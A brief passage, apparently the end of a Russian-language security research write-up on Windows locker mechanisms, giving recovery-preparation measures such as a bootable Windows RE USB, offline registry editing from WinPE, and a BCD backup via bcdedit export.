### 5.4 Подготовка к восстановлению

| Мера | Реализация |
|------|------------|
| **Windows RE USB** | Держать загрузочную Windows RE USB |
| **Офлайн редактор реестра** | Уметь редактировать реестр из WinPE |
| **Резервная копия BCD** | `bcdedit /export C:\bcd_backup` |

---

<div align="center">

**[⬆ Back to Top](#-windows-locker-research-complete-technical-analysis)**

*Security Research — Windows System Locking Mechanisms*

</div>
